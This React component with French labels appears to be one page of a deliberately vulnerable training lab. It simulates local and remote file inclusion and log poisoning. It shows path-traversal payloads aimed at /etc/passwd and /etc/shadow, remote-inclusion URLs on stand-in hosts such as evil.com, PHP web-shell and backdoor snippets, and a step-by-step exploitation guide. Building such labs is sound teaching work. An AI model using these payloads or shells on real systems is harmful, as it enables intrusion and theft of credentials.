
import { useState } from 'react';
import { Link } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ArrowLeft, AlertTriangle, File, ExternalLink } from 'lucide-react';
import { toast } from "sonner";

const FileInclude = () => {
  const [localFile, setLocalFile] = useState('');
  const [remoteUrl, setRemoteUrl] = useState('');
  const [fileContent, setFileContent] = useState('');
  const [includeType, setIncludeType] = useState<'local' | 'remote'>('local');

  // Simulation de fichiers système
  const simulatedFiles: { [key: string]: string } = {
    '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false`,
    '/etc/shadow': `root:$6$salt$hashed_password_here:18000:0:99999:7:::
www-data:*:18000:0:99999:7:::`,
    '/var/www/config.php': `<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "super_secret_password_123";
$secret_key = "jwt_secret_key_987654321";
?>`,
    '../../../windows/system32/drivers/etc/hosts': `127.0.0.1    localhost
::1          localhost
192.168.1.100 internal-admin-panel`,
    'C:\\windows\\system.ini': `[drivers]
wave=mmdrv.dll
timer=timer.drv
[mci]
cdaudio=mcicda.drv`
  };

  const handleLocalFileInclude = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 1: LOCAL FILE INCLUSION (LFI)
    // Le paramètre file est directement utilisé sans validation
    console.log('LFI ATTEMPT:', localFile);
    
    // Simulation de différents payloads LFI
    let content = '';
    
    // Path traversal
    if (localFile.includes('../') || localFile.includes('..\\')) {
      console.log('DIRECTORY TRAVERSAL DETECTED:', localFile);
      toast.error("Directory Traversal détecté mais non bloqué!");
    }

    // Tentative de lecture de fichiers sensibles
    const normalizedPath = localFile.replace(/\.\.\//g, '').replace(/\.\.\\/g, '');
    
    if (simulatedFiles[localFile]) {
      content = simulatedFiles[localFile];
    } else if (localFile.includes('passwd')) {
      content = simulatedFiles['/etc/passwd'];
    } else if (localFile.includes('shadow')) {
      content = simulatedFiles['/etc/shadow'];
    } else if (localFile.includes('config')) {
      content = simulatedFiles['/var/www/config.php'];
    } else if (localFile.includes('hosts')) {
      content = simulatedFiles['../../../windows/system32/drivers/etc/hosts'];
    } else if (localFile.includes('system.ini')) {
      content = simulatedFiles['C:\\windows\\system.ini'];
    } else {
      // Simulation d'erreur avec divulgation d'informations
      content = `Erreur: Impossible de lire le fichier "${localFile}"
Chemin complet tenté: /var/www/html/includes/${localFile}
Permissions: www-data:www-data 644
Serveur: Apache/2.4.41 (Ubuntu)`;
    }

    setFileContent(content);
    console.log('FILE CONTENT EXPOSED:', content);
  };

  const handleRemoteFileInclude = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 2: REMOTE FILE INCLUSION (RFI)
    // L'URL fournie par l'utilisateur est directement incluse
    console.log('RFI ATTEMPT:', remoteUrl);
    
    let content = '';
    
    // Simulation de différents scénarios RFI
    if (remoteUrl.includes('evil.com') || remoteUrl.includes('malicious')) {
      content = `<?php
// Web Shell uploaded via RFI
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
echo "Remote shell active!";
?>`;
      toast.error("Script malveillant chargé depuis un site externe!");
    } else if (remoteUrl.includes('pastebin.com')) {
      content = `<?php
// Code malveillant depuis Pastebin
file_put_contents('backdoor.php', base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'));
echo "Backdoor installed!";
?>`;
      toast.error("Backdoor installé via RFI!");
    } else if (remoteUrl.startsWith('ftp://')) {
      content = "Connexion FTP établie - Fichier malveillant téléchargé depuis le serveur FTP";
    } else if (remoteUrl.startsWith('data:')) {
      content = "Data URI detected - Code PHP exécuté directement depuis l'URL";
    } else {
      content = `Simulation: Contenu distant chargé depuis ${remoteUrl}
<?php echo "Remote file inclusion successful!"; ?>`;
    }

    setFileContent(content);
    console.log('REMOTE FILE INCLUDED:', { url: remoteUrl, content });
  };

  const simulateLogPoisoning = () => {
    // VULNÉRABILITÉ 3: LOG POISONING
    // Combiner LFI avec empoisonnement des logs
    const logPath = '/var/log/apache2/access.log';
    const poisonedLog = `192.168.1.100 - - [25/Dec/2023:10:15:30 +0000] "GET / HTTP/1.1" 200 1234
127.0.0.1 - - [25/Dec/2023:10:16:45 +0000] "GET /<?php system($_GET['cmd']); ?> HTTP/1.1" 404 567
192.168.1.101 - - [25/Dec/2023:10:17:12 +0000] "GET /admin HTTP/1.1" 403 890`;

    setLocalFile(logPath);
    setFileContent(poisonedLog);
    setIncludeType('local');
    
    toast.error("Log poisoning simulé - Code PHP injecté dans les logs!");
    console.log('LOG POISONING ATTACK');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-50 p-4">
      <div className="container mx-auto max-w-4xl space-y-6">
        <div className="flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-red-600 hover:text-red-800">
            <ArrowLeft className="h-4 w-4" />
            Retour à l'accueil
          </Link>
          <Button onClick={simulateLogPoisoning} className="bg-purple-600 hover:bg-purple-700">
            Log Poisoning
          </Button>
        </div>

        <div className="grid md:grid-cols-2 gap-6">
          {/* Local File Inclusion */}
          <Card className="border-red-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <File className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-red-600" />
                LFI - Local File Inclusion
              </CardTitle>
            </CardHeader>
            <CardContent>
              <Alert className="mb-4 border-red-200">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription className="text-red-700">
                  <strong>Danger:</strong> Lecture de fichiers système sensibles possible
                </AlertDescription>
              </Alert>

              <form onSubmit={handleLocalFileInclude} className="space-y-4">
                <div>
                  <Label htmlFor="localFile">Fichier à inclure</Label>
                  <Input
                    id="localFile"
                    value={localFile}
                    onChange={(e) => setLocalFile(e.target.value)}
                    placeholder="../../../etc/passwd"
                  />
                </div>
                <Button type="submit" className="w-full bg-red-600 hover:bg-red-700">
                  Inclure fichier local
                </Button>
              </form>

              <div className="mt-4 text-xs text-gray-600 space-y-1">
                <p><strong>Payloads à tester:</strong></p>
                <ul className="space-y-1">
                  <li>• /etc/passwd</li>
                  <li>• ../../../etc/shadow</li>
                  <li>• /var/www/config.php</li>
                  <li>• /var/log/apache2/access.log</li>
                  <li>• C:\windows\system.ini</li>
                </ul>
              </div>
            </CardContent>
          </Card>

          {/* Remote File Inclusion */}
          <Card className="border-orange-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <ExternalLink className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-orange-600" />
                RFI - Remote File Inclusion
              </CardTitle>
            </CardHeader>
            <CardContent>
              <Alert className="mb-4 border-orange-200">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription className="text-orange-700">
                  <strong>Danger:</strong> Exécution de code distant possible
                </AlertDescription>
              </Alert>

              <form onSubmit={handleRemoteFileInclude} className="space-y-4">
                <div>
                  <Label htmlFor="remoteUrl">URL à inclure</Label>
                  <Input
                    id="remoteUrl"
                    value={remoteUrl}
                    onChange={(e) => setRemoteUrl(e.target.value)}
                    placeholder="http://evil.com/shell.txt"
                  />
                </div>
                <Button type="submit" className="w-full bg-orange-600 hover:bg-orange-700">
                  Inclure fichier distant
                </Button>
              </form>

              <div className="mt-4 text-xs text-gray-600 space-y-1">
                <p><strong>URLs malveillantes à tester:</strong></p>
                <ul className="space-y-1">
                  <li>• http://evil.com/shell.php</li>
                  <li>• http://pastebin.com/raw/malicious</li>
                  <li>• ftp://attacker.com/backdoor.php</li>
                  <li>• data://text/plain;base64,PD9waHA=</li>
                </ul>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Affichage du contenu du fichier */}
        {fileContent && (
          <Card className="border-red-400">
            <CardHeader>
              <CardTitle className="text-red-700">
                Contenu du fichier (Exposition de données sensibles!)
              </CardTitle>
            </CardHeader>
            <CardContent>
              <pre className="bg-black text-green-400 p-4 rounded text-xs overflow-x-auto whitespace-pre-wrap">
                {fileContent}
              </pre>
            </CardContent>
          </Card>
        )}

        {/* Guide d'exploitation */}
        <Card className="border-red-300">
          <CardHeader>
            <CardTitle className="text-red-700">Guide d'exploitation - File Inclusion</CardTitle>
          </CardHeader>
          <CardContent className="text-sm space-y-4">
            <div>
              <strong className="text-red-600">1. Local File Inclusion (LFI):</strong>
              <ul className="ml-4 mt-2 space-y-1">
                <li>• <strong>Linux:</strong> /etc/passwd, /etc/shadow, /var/log/apache2/access.log</li>
                <li>• <strong>Windows:</strong> C:\windows\system.ini, C:\boot.ini</li>
                <li>• <strong>Configuration:</strong> ../config.php, ../../wp-config.php</li>
                <li>• <strong>Directory Traversal:</strong> ../../../etc/passwd</li>
                <li>• <strong>Null byte bypass:</strong> ../../../etc/passwd%00</li>
              </ul>
            </div>

            <div>
              <strong className="text-orange-600">2. Remote File Inclusion (RFI):</strong>
              <ul className="ml-4 mt-2 space-y-1">
                <li>• <strong>Web shells:</strong> http://attacker.com/shell.php</li>
                <li>• <strong>Pastebin:</strong> https://pastebin.com/raw/xyz</li>
                <li>• <strong>FTP:</strong> ftp://attacker.com/backdoor.php</li>
                <li>• <strong>Data URI:</strong> data://text/plain;base64,[encoded_php]</li>
              </ul>
            </div>

            <div>
              <strong className="text-purple-600">3. Log Poisoning:</strong>
              <ul className="ml-4 mt-2 space-y-1">
                <li>• Injecter du PHP dans User-Agent: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
                <li>• Inclure le log: /var/log/apache2/access.log</li>
                <li>• Exécuter: ?cmd=whoami</li>
              </ul>
            </div>

            <div className="bg-yellow-100 p-3 rounded">
              <strong>Exemple d'exploitation complète:</strong>
              <ol className="ml-4 mt-2 space-y-1 text-xs">
                <li>1. Identifier le paramètre vulnérable: <code>?file=../../../etc/passwd</code></li>
                <li>2. Tester directory traversal et null bytes</li>
                <li>3. Lire des fichiers de configuration sensibles</li>
                <li>4. Si RFI possible, uploader un web shell</li>
                <li>5. Obtenir l'exécution de commandes système</li>
              </ol>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default FileInclude;
